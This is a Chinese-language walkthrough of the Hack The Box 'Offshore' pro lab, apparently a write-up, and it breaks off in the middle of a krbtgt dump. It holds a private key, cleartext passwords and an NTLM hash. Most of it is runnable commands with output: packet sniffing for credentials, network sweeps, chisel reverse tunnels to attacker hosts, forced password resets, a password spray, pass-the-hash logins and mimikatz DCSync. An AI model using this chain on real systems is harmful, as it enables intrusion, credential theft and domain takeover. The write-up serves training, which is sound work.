MAqQSE2vMisfQEb6moWUQKEa8aZ+VYBnE2Lp9oAAQWsVINzVMKxdHBsCgYEAy8H9
KcgtoVNzFJZQxPNIwR6QdngCn2GKu93+Z4vX/d00zA/XkpkYQHZvqKwSafmgu2AX
j5hhJkUVz+iNZzU6pZKBoHxSNnJOynSeQMzHNKikNud9YW8pas+buYi2TSxTFL1L
H6vKATQn3aSFWsM/eNFVdDGp8mcPkQ3vl5FIXEsCgYASbS/8mhF1DgraSqpuKn/7
VTmWipyr+pI1ABZ8JCI9lgLwdNOvvh/pMETpRejf4ChVdBl3ZAf+CWkGrKiyfHqx
5iopIkSDG7PNz7PlmDqpci1z+FiTfWAKmNk7e62hM1wk+oFb71FXpm78fMuFQAeL
Ku73Z8EeJN6J0P9z3QakIwKBgQCQZMGumVBU0hlsjnVgjPOS/8DqY3OgVPSG2/PM
l1qSae9faR6goeOA0y2fv4kxFpjkEF3CAf9eqnihpLCIYj1UVnWMMG3mba0OZgQ7
8aJ928C7s+KzaJ5WNheqLIrcN7wMp3SUVh5KKhbSSCPExTa2vMotFIDV6lkqt1CB
/Y/k7wKBgESEY+taPfoUO49mMsmiBn96XlTx9pCg6WlXPZeCTCymUXDovNn1HfxK
CS5Lckpjr11RNP+xb8G1Q8xSiJNfMtrBsVh2es7QxVnrQsd4B+2UQC5llehHD/Uk
pnJob1HS8o17jQFgleQYYFvDDtGqj87ZgfcLBmc+JbP+oYiXbfKE
-----END RSA PRIVATE KEY-----
```

保存下来

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# nano 123
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# chmod 600 123   

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# ssh -i 123 root@10.10.110.123
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Feb  5 01:41:07 2026 from 10.10.14.87
root@NIX01:~#
```

## 流量嗅探
### 判断
```c
root@NIX01:/tmp# netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:8089            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8065          0.0.0.0:*               LISTEN     
tcp        0      0 172.16.1.23:22          10.10.16.241:58164      ESTABLISHED
tcp        0      0 172.16.1.23:22          10.10.16.241:53030      ESTABLISHED
tcp        0      0 172.16.1.23:54140       10.10.14.6:4443         CLOSE_WAIT 
tcp        0      0 172.16.1.23:33144       10.10.16.241:53         CLOSE_WAIT 
tcp        0      0 172.16.1.23:33380       10.10.16.241:11         ESTABLISHED
tcp        0      0 172.16.1.23:34292       10.10.14.6:4443         CLOSE_WAIT 
tcp        0      0 172.16.1.23:39552       10.10.14.6:4443         CLOSE_WAIT 
tcp        0      1 172.16.1.23:36806       10.10.14.6:4443         SYN_SENT   
tcp        0    108 172.16.1.23:22          10.10.16.241:38722      ESTABLISHED
tcp        0      0 172.16.1.23:51340       10.10.14.6:4443         CLOSE_WAIT 
```

确实是存在跟其他主机存在流量的

### 抓包
```c
tcpdump -i eth0 -vv -w /tmp/web.pcap
```

等待一段时间(5-10分钟)后停止。

### 分析数据包
```c
# 在Kali上分析
tcpdump -r web.pcap -A | grep -i "password\|flag\|admin"

```
root@NIX01:/tmp# tcpdump -r web.pcap -A | grep -i "password\|admin"
reading from file web.pcap, link-type EN10MB (Ethernet)
E..wF.@...Y............PZ.....f.P. ..V..username=admin&flag=OFFSHORE%7Bl0v3_cl3artext_pr0toc0l%24%7D&password=Zaq12wsx!
```

或使用Wireshark:

```c
# 导出到Kali
scp -i 123 root@10.10.110.123:/tmp/web.pcap .
wireshark web.pcap
```

### 发现凭据
在HTTP POST数据中发现:

```c
POST /apiclient/login.jsp HTTP/1.1
Host: 172.16.1.23
Content-Type: application/x-www-form-urlencoded

username=admin&flag=OFFSHORE%7Bl0v3_cl3artext_pr0toc0l%24%7D&password=Zaq12wsx!
```

![](/image/prolabs/Offshore-14.png)

> 共三个参数
>
> username=admin&flag=OFFSHORE%7Bl0v3_cl3artext_pr0toc0l%24%7D&password=Zaq12wsx!
>

得到**凭据**: `admin:Zaq12wsx!`和flag:OFFSHORE{l0v3_cl3artext_pr0toc0l$}

![](/image/prolabs/Offshore-15.png)

由于数据包来自172.16.1.30，所以接下来我们将访问该网站

## 内网探测
### ifconfig
```c
root@NIX01:/tmp# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.1.23  netmask 255.255.255.0  broadcast 172.16.1.255
        inet6 fe80::250:56ff:fe94:eb07  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:eb:07  txqueuelen 1000  (Ethernet)
        RX packets 218673  bytes 38900908 (38.9 MB)
        RX errors 0  dropped 100  overruns 0  frame 0
        TX packets 215942  bytes 54545784 (54.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 274811  bytes 93340626 (93.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 274811  bytes 93340626 (93.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0 
```

### ip扫描
```c
root@NIX01:/tmp# for i in {1..255};do(ping -c 1 10.10.110.$i|grep "bytes from"|cut -d' ' -f4|tr -d ':' &);done
10.10.110.2
10.10.110.3
10.10.110.123
10.10.110.124
10.10.110.122

root@NIX01:/tmp# for i in {1..255};do(ping -c 1 172.16.1.$i|grep "bytes from"|cut -d' ' -f4|tr -d ':' &);done
172.16.1.5
172.16.1.15
172.16.1.22
172.16.1.23 (本机)
172.16.1.24
172.16.1.30
172.16.1.36
172.16.1.101
172.16.1.201
172.16.1.200
172.16.1.220
```

### 端口扫描
```c
export ip=$IP; for port in $(seq 1 10000); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
```

### 系统扫描
```c
for ip in 172.16.1.{1..254}; do ping -c 1 -W 1 $ip 2>/dev/null | grep -q "ttl=" && ping -c 1 -W 1 $ip 2>/dev/null | grep -o "ttl=[0-9]\+" | cut -d= -f2 | awk -v ip=$ip '{if($1<=64)print ip" -> Linux/Unix (TTL="$1")"; else if($1<=128)print ip" -> Windows (TTL="$1")"; else print ip" -> Unknown (TTL="$1")"}'; done

172.16.1.5 -> Windows (TTL=128)
172.16.1.15 -> Windows (TTL=128)
172.16.1.22 -> Linux/Unix (TTL=64)
172.16.1.23 -> Linux/Unix (TTL=64)
172.16.1.24 -> Windows (TTL=128)
172.16.1.30 -> Windows (TTL=128)
172.16.1.36 -> Windows (TTL=128)
172.16.1.101 -> Windows (TTL=128)
172.16.1.200 -> Windows (TTL=128)
172.16.1.201 -> Windows (TTL=128)
172.16.1.220 -> Windows (TTL=128)
```

## 隧道搭建
可以直接使用ssh端口转发形成动态socks

但是稳定性不如工具

所以咱们使用chisel

```c
┌──(kali㉿kali)-[~/Desktop/tools/chisel]
└─$ scp -i ../../htb/offshore/123 chisel root@10.10.110.123:/tmp/chisel
chisel                                 100%   10MB 287.7KB/s   00:34 

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# chisel server -p 1332 --reverse
2026/02/05 22:20:34 server: Reverse tunnelling enabled
2026/02/05 22:20:34 server: Fingerprint +15rIDCfe0E9cNwdjs8j6+CES7yiT6fN5of61LeCxM0=
2026/02/05 22:20:34 server: Listening on http://0.0.0.0:1332


root@NIX01:/tmp# ./chisel client 10.10.16.30:1332 R:1234:socks
2026/02/07 20:10:27 client: Connecting to ws://10.10.16.30:1332
2026/02/07 20:10:32 client: Connected (Latency 508.687086ms)
```

# 172.16.1.5(Windows)（Setp:6）
## 端口扫描
```c
export ip=172.16.1.5; for port in $(seq 1 40000); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
Port open 53
Port open 88
Port open 135
Port open 139
Port open 389
Port open 445
Port open 464
Port open 593
Port open 636
Port open 3268
Port open 3269
Port open 3389
Port open 5985
Port open 9389
```

## 凭据信息
```c
pgibbons\I l0ve going Fishing!
salvador\Password123! (个人修改)
```

## 横向移动
在bloodhound中发现了一个攻击链

SALVADOR@CORP.LOCAL->CYBER_ADM@CORP.LOCAL

![](/image/prolabs/Offshore-16.png)

![](/image/prolabs/Offshore-17.png)

![](/image/prolabs/Offshore-18.png)

![](/image/prolabs/Offshore-19.png)

SALVADOR 是 IT ADMINS组的  

IT ADMINS组又是SERVICE DESK组的

SERVICE DESK组可以 genericwrite SECURITY ENGINEERS组   

那么我们可以直接将SALVADOR加入到SECURITY ENGINEERS组

```c
PS C:\Users\Public\Downloads> net group "Security Engineers" salvador /domain /add
net group "Security Engineers" salvador /domain /add
The request will be processed at a domain controller for domain corp.local.

System error 5 has occurred.

Access is denied.
```

失败了

原因：

👉 `net group` 需要你 **本身是该组的管理员 / Domain Admin / Account Operators**

### bloodAD
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q bloodyAD --host 172.16.1.5 -d corp.local -u salvador -p 'Password123!' \
add groupMember "Security Engineers" salvador
[+] salvador added to Security Engineers
```

**为什么 **`**net group**`** 不行，但 bloodyAD 行？**

| 方法 | 本质 | 需要什么 |
| --- | --- | --- |
| net group | 调用系统 API | 你必须是组管理员 |
| bloodyAD | 直接改 LDAP 属性 | 只要你有写权限 |


### AllExtendedRights
```c
扩展权限是授予对象的特殊权限，允许读取特权内容 属性，以及执行特殊操作。
滥用信息 对用户的权限
拥有此权限的用户将能够重置用户的密码。
```

![](/image/prolabs/Offshore-20.png)

```c
proxychains -q net rpc password cyber_adm 'Password123!' -U 'corp.local/salvador%Password123!' -S 172.16.1.5
```

```c
proxychains -q crackmapexec smb 172.16.1.5 -u cyber_adm -p 'Password123!' 
SMB         172.16.1.5      445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:True)
[proxychains] Strict chain  ...  127.0.0.1:1234  ...  172.16.1.5:445  ...  OK
SMB         172.16.1.5      445    DC01             [+] corp.local\cyber_adm:Password123!   
```

### ForceChangePassword
![](/image/prolabs/Offshore-21.png)

```c
proxychains -q net rpc password cyberops_svc 'Password123!' -U 'corp.local/cyber_adm%Password123!' -S 172.16.1.5
```

## 密码喷洒
```c
proxychains -q crackmapexec winrm 172.16.1.1-101 -u cyber_adm -p 'Password123!'

WINRM       172.16.1.24     5985   WEB-WIN01        
[+] corp.local\cyber_adm:Password123! (Pwn3d!)
```

我们回到172.16.1.24(Windows) 

cyber_adm用户比system用户更有作用是因为**本机 SYSTEM ≠ 域管理员权限**

# 172.16.1.5(Windows)（Setp:8）
## 登录域控
```plain
proxychains -q evil-winrm -i 172.16.1.5 -u administrator -H 0109d7e72fcfe404186c4079ba6cf79c
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q evil-winrm -i 172.16.1.5 -u administrator -H 0109d7e72fcfe404186c4079ba6cf79c
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                  
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                             
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

## 信息收集
### 域内主机信息
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ADComputer -Filter * -Properties IPv4Address


DistinguishedName : CN=DC01,OU=Domain Controllers,DC=corp,DC=local
DNSHostName       : DC01.corp.local
Enabled           : True
IPv4Address       : 172.16.1.5
Name              : DC01
ObjectClass       : computer
ObjectGUID        : e80ea391-3ced-478d-a7fc-8ce04b623cf6
SamAccountName    : DC01$
SID               : S-1-5-21-2291914956-3290296217-2402366952-1000
UserPrincipalName :

DistinguishedName : CN=SQL01,OU=SQL Servers,OU=Servers,OU=Corp,DC=corp,DC=local
DNSHostName       : SQL01.corp.local
Enabled           : True
IPv4Address       : 172.16.1.15
Name              : SQL01
ObjectClass       : computer
ObjectGUID        : af347718-2820-488e-b6ab-50a7f5dddb11
SamAccountName    : SQL01$
SID               : S-1-5-21-2291914956-3290296217-2402366952-1811
UserPrincipalName :

DistinguishedName : CN=FS01,OU=File Servers,OU=Servers,OU=Corp,DC=corp,DC=local
DNSHostName       : FS01.corp.local
Enabled           : True
IPv4Address       : 172.16.1.26
Name              : FS01
ObjectClass       : computer
ObjectGUID        : e4b01019-307b-474e-b3a8-85a8d478b692
SamAccountName    : FS01$
SID               : S-1-5-21-2291914956-3290296217-2402366952-1812
UserPrincipalName :

DistinguishedName : CN=WS02,OU=Workstations,OU=Corp,DC=corp,DC=local
DNSHostName       : WS02.corp.local
Enabled           : True
IPv4Address       : 172.16.1.101
Name              : WS02
ObjectClass       : computer
ObjectGUID        : 920e03bc-7a09-4126-9b71-1d7966b117a2
SamAccountName    : WS02$
SID               : S-1-5-21-2291914956-3290296217-2402366952-1813
UserPrincipalName :

DistinguishedName : CN=MS01,OU=Servers,OU=Corp,DC=corp,DC=local
DNSHostName       : MS01.corp.local
Enabled           : True
IPv4Address       : 172.16.1.30
Name              : MS01
ObjectClass       : computer
ObjectGUID        : 527cd8df-1bcc-498c-9418-faf1026c52ad
SamAccountName    : MS01$
SID               : S-1-5-21-2291914956-3290296217-2402366952-3602
UserPrincipalName :

DistinguishedName : CN=WSADM,OU=Workstations,OU=Corp,DC=corp,DC=local
DNSHostName       : WSADM.corp.local
Enabled           : True
IPv4Address       : 172.16.1.36
Name              : WSADM
ObjectClass       : computer
ObjectGUID        : 4d984c71-9a8b-46bf-b3a1-361e13196e78
SamAccountName    : WSADM$
SID               : S-1-5-21-2291914956-3290296217-2402366952-4102
UserPrincipalName :

DistinguishedName : CN=WEB-WIN01,OU=Web Servers,OU=Servers,OU=Corp,DC=corp,DC=local
DNSHostName       : WEB-WIN01.corp.local
Enabled           : True
IPv4Address       : 172.16.1.24
Name              : WEB-WIN01
ObjectClass       : computer
ObjectGUID        : 8d919200-8e8b-4437-b8e8-bcdfedbfe00c
SamAccountName    : WEB-WIN01$
SID               : S-1-5-21-2291914956-3290296217-2402366952-7101
UserPrincipalName :


```

### 域内主机SMB
```plain
┌──(kali㉿kali)-[~/Desktop/tools/netcat]
└─$ proxychains -q crackmapexec smb 172.16.1.0/24 \
-u administrator \
-H 0109d7e72fcfe404186c4079ba6cf79c 

SMB         172.16.1.15     445    SQL01            [+] corp.local\administrator:0109d7e72fcfe404186c4079ba6cf79c (Pwn3d!)                                                          
SMB         172.16.1.5      445    DC01             [+] corp.local\administrator:0109d7e72fcfe404186c4079ba6cf79c (Pwn3d!)                                                          
SMB         172.16.1.26     445    FS01             [+] corp.local\administrator:0109d7e72fcfe404186c4079ba6cf79c (Pwn3d!)                                                          
SMB         172.16.1.30     445    MS01             [+] corp.local\administrator:0109d7e72fcfe404186c4079ba6cf79c (Pwn3d!)                                                          
SMB         172.16.1.24     445    WEB-WIN01        [+] corp.local\administrator:0109d7e72fcfe404186c4079ba6cf79c (Pwn3d!)                                                          
SMB         172.16.1.36     445    WSADM            [+] corp.local\administrator:0109d7e72fcfe404186c4079ba6cf79c (Pwn3d!)                                                          
SMB         172.16.1.101    445    WS02             [+] corp.local\administrator:0109d7e72fcfe404186c4079ba6cf79c (Pwn3d!)                                                          
SMB         172.16.1.220    445    SRV01            [-] LAB.OFFSHORE.LOCAL\administrator:0109d7e72fcfe404186c4079ba6cf79c STATUS_LOGON_FAILURE 
SMB         172.16.1.200    445    DC0              [-] LAB.OFFSHORE.LOCAL\administrator:0109d7e72fcfe404186c4079ba6cf79c STATUS_LOGON_FAILURE 
SMB         172.16.1.201    445    JOE-LPTP         [-] JOE-LPTP\administrator:0109d7e72fcfe404186c4079ba6cf79c STATUS_LOGON_FAILURE 
```

### 网段扫描
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> 1..254 | ForEach-Object {
    $ip = "172.16.2.$_"
    if (Test-Connection $ip -Count 1 -Quiet) {
        "$ip is alive"
    }
}
172.16.2.6 is alive
172.16.2.102 is alive


*Evil-WinRM* PS C:\Users\Administrator\Documents> 1..254 | ForEach-Object {
    $ip = "172.16.3.$_"
    if (Test-Connection $ip -Count 1 -Quiet) {
        "$ip is alive"
    }
}
172.16.3.5 is alive
```

### 端口扫描
#### 172.16.2.6
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents>
$ip = "172.16.2.6"
1..65535 | ForEach-Object {
    $port = $_
    $client = New-Object System.Net.Sockets.TcpClient
    $iar = $client.BeginConnect($ip, $port, $null, $null)

    if ($iar.AsyncWaitHandle.WaitOne(10, $false)) {
        try {
            $client.EndConnect($iar)
            Write-Output "Port open $port"
        } catch {}
    }

    $client.Close()
}
Port open 53
Port open 88
Port open 135
Port open 139
Port open 389
Port open 445
Port open 464
Port open 593
Port open 636
Port open 3269
Port open 3389
Port open 5985
Port open 9389
Port open 47001
Port open 49664
Port open 49665
Port open 49666
Port open 49668
Port open 49671
Port open 49676
Port open 49677
Port open 49679
Port open 49684
Port open 49699
Port open 49735

```

#### 172.16.2.102
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents>
$ip = "172.16.2.102"
1..65535 | ForEach-Object {
    $port = $_
    $client = New-Object System.Net.Sockets.TcpClient
    $iar = $client.BeginConnect($ip, $port, $null, $null)

    if ($iar.AsyncWaitHandle.WaitOne(10, $false)) {
        try {
            $client.EndConnect($iar)
            Write-Output "Port open $port"
        } catch {}
    }

    $client.Close()
}
Port open 135
Port open 139
Port open 445
Port open 3389                                                             
Port open 5357
Port open 49152
Port open 49153
Port open 49154
Port open 49155
Port open 49156
Port open 49157
```

#### 172.16.3.5
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents>
$ip = "172.16.3.5"
1..65535 | ForEach-Object {
    $port = $_
    $client = New-Object System.Net.Sockets.TcpClient
    $iar = $client.BeginConnect($ip, $port, $null, $null)

    if ($iar.AsyncWaitHandle.WaitOne(10, $false)) {
        try {
            $client.EndConnect($iar)
            Write-Output "Port open $port"
        } catch {}
    }

    $client.Close()
}
Port open 53
Port open 88
Port open 135
Port open 139
Port open 389
Port open 445
Port open 464
Port open 593
Port open 636
Port open 3268
Port open 3269
Port open 3389
Port open 5985
Port open 9389
Port open 47001
Port open 49664
Port open 49665
Port open 49666
Port open 49668
Port open 49671
Port open 49676
Port open 49677
Port open 49678
Port open 49681
Port open 49689
Port open 49702
```

### 查看域信息
```c
*Evil-WinRM* PS C:\> Get-ADForest

ApplicationPartitions : {DC=DomainDnsZones,DC=corp,DC=local, DC=ForestDnsZones,DC=corp,DC=local}
CrossForestReferences : {}
DomainNamingMaster    : DC01.corp.local
Domains               : {corp.local}
ForestMode            : Windows2016Forest
GlobalCatalogs        : {DC01.corp.local}
Name                  : corp.local
PartitionsContainer   : CN=Partitions,CN=Configuration,DC=corp,DC=local
RootDomain            : corp.local
SchemaMaster          : DC01.corp.local
Sites                 : {Default-First-Site-Name}
SPNSuffixes           : {}
UPNSuffixes           : {}
```

```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> nltest /dsgetdc:dev.ADMIN.OFFSHORE.COM
           DC: \\DC02.dev.ADMIN.OFFSHORE.COM
      Address: \\172.16.2.6
     Dom Guid: 197e325c-06c4-4fcd-97b3-be5a4c8d78c2
     Dom Name: dev.ADMIN.OFFSHORE.COM
  Forest Name: ADMIN.OFFSHORE.COM
 Dc Site Name: Default-First-Site-Name
Our Site Name: Default-First-Site-Name
        Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_DC DNS_DOMAIN DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10 0x20000
The command completed successfully
```

### 查看域信任
```c
*Evil-WinRM* PS C:\> cmd /c nltest /domain_trusts
List of domain trusts:
    0: DEV dev.ADMIN.OFFSHORE.COM (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: quarantined )
    1: CORP corp.local (NT 5) (Forest Tree Root) (Primary Domain) (Native)
```

这说明：

+ corp.local 是一棵 forest 的 root
+ dev.ADMIN.OFFSHORE.COM 是另一棵 forest
+ 两边是 **跨林信任**
+ 并且是 **quarantined（SID filtering 开启）**

关键是这个：

```plain
Attr: quarantined
```

quarantined翻译中文为隔离

这是一个：

**🔐**** External Trust（隔离信任）  
****并且是 SID Filtering 开启状态**

也就是说：

+ ❌ 你是 corp 的 Enterprise Admin
+ ❌ 但这个权限不会传递到 dev.ADMIN.OFFSHORE.COM
+ ❌ 不能跨 Forest 做 DCSync
+ ❌ 不能用 Enterprise Admin 横向

###  DEV 域 IP
```c
ping dev.ADMIN.OFFSHORE.COM

Pinging dev.ADMIN.OFFSHORE.COM [172.16.2.6] with 32 bytes of data:
Reply from 172.16.2.6: bytes=32 time=1ms TTL=127
Reply from 172.16.2.6: bytes=32 time=1ms TTL=127
Reply from 172.16.2.6: bytes=32 time<1ms TTL=127
Reply from 172.16.2.6: bytes=32 time=1ms TTL=127

Ping statistics for 172.16.2.6:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 1ms, Average = 0ms
```

### 查看权限
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /groups
                                                                                                                                                                                
GROUP INFORMATION                                                                                                                                                               
-----------------                                                                                                                                                               
                                                                                                                                                                                
Group Name                                  Type             SID                                            Attributes                                                          
=========================================== ================ ============================================== ===============================================================     
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                      Alias            S-1-5-32-544                                   Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CORP\CyberOps                               Group            S-1-5-21-2291914956-3290296217-2402366952-1117 Mandatory group, Enabled by default, Enabled group
CORP\Domain Admins                          Group            S-1-5-21-2291914956-3290296217-2402366952-512  Mandatory group, Enabled by default, Enabled group
CORP\Group Policy Creator Owners            Group            S-1-5-21-2291914956-3290296217-2402366952-520  Mandatory group, Enabled by default, Enabled group
CORP\Schema Admins                          Group            S-1-5-21-2291914956-3290296217-2402366952-518  Mandatory group, Enabled by default, Enabled group
CORP\Enterprise Admins                      Group            S-1-5-21-2291914956-3290296217-2402366952-519  Mandatory group, Enabled by default, Enabled group
CORP\Denied RODC Password Replication Group Alias            S-1-5-21-2291914956-3290296217-2402366952-572  Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level        Label            S-1-16-12288

```

## 搭建隧道
```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ chisel server -p 1332 --reverse
```

```c
proxychains -q evil-winrm -i 172.16.1.5 -u administrator -H 0109d7e72fcfe404186c4079ba6cf79c
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload ../../tools/chisel/chisel.exe
*Evil-WinRM* PS C:\Users\Administrator\Documents> Start-Process -WindowStyle Hidden -FilePath .\chisel.exe -ArgumentList "client 10.10.16.2:1332 R:1235:socks"
```

```c
while ($true) {
    Start-Process -WindowStyle Hidden -FilePath .\chisel.exe -ArgumentList "client 10.10.16.2:1332 R:1235:socks"
    Start-Sleep 10
}
```

## 横向-DC02(失败)
### 直接 DCSync DEV 域  (失败)
#### Dump Trust Key
在 external trust 下：

两个域之间用一个：

```plain
Inter-domain trust password
```

来签发跨域 TGT。

只要你拿到这个：

👉 你就可以伪造来自 DEV 域的票据  
👉 直接变成 DEV\Domain Admin

#### Mimikatz
上传mimikatz:

```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload ../../tools/mimikatz/x64/mimikatz.exe
                                        
Info: Uploading /home/kali/Desktop/tools/mimikatz/x64/mimikatz.exe to C:\Users\Administrator\Documents\mimikatz.exe

```

在 DC 上运行 mimikatz：

```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:dev.ADMIN.OFFSHORE.COM /all" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::dcsync /domain:dev.ADMIN.OFFSHORE.COM /all
[DC] 'dev.ADMIN.OFFSHORE.COM' will be the domain
[DC] 'DC02.dev.ADMIN.OFFSHORE.COM' will be the DC server
[DC] Exporting domain 'dev.ADMIN.OFFSHORE.COM'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
ERROR kull_m_rpc_drsr_getDCBind ; RPC Exception 0x00000005 (5)

mimikatz(commandline) # exit
Bye!
```

`**0x00000005 = Access Denied**`

👉 你 **没有权限对 dev 子域执行 DCSync**

### winrm-dev域(失败)
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q evil-winrm -i DC02.dev.ADMIN.OFFSHORE.COM -u Administrator -H 0109d7e72fcfe404186c4079ba6cf79c 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\> 
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError                                                              
                                        
Error: Exiting with code 1

```

这是一个：

**🔐**** External Trust（隔离信任）  
****并且是 SID Filtering 开启状态**

也就是说：

+ ❌ 你是 corp 的 Enterprise Admin
+ ❌ 但这个权限不会传递到 dev.ADMIN.OFFSHORE.COM
+ ❌ 不能跨 Forest 做 DCSync
+ ❌ 不能用 Enterprise Admin 横向

### 利用 Trust 提权(失败)
#### 1️⃣ 在 corp dump 所有信任相关信息
```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> nltest /trusted_domains
List of domain trusts:
    0: DEV dev.ADMIN.OFFSHORE.COM (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: quarantined )
    1: CORP corp.local (NT 5) (Forest Tree Root) (Primary Domain) (Native)
The command completed successfully

```

```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ADTrust -Filter *
 
Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=dev.ADMIN.OFFSHORE.COM,CN=System,DC=corp,DC=local
ForestTransitive        : False
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : dev.ADMIN.OFFSHORE.COM
ObjectClass             : trustedDomain
ObjectGUID              : 59d28066-5e51-4441-bc92-5155aeadf2d4
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : True
Source                  : DC=corp,DC=local
Target                  : dev.ADMIN.OFFSHORE.COM
TGTDelegation           : False
TrustAttributes         : 4
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```

#### 2️⃣ dump corp 的 krbtgt
```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:corp.local /user:krbtgt
[DC] 'corp.local' will be the domain
[DC] 'DC01.corp.local' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
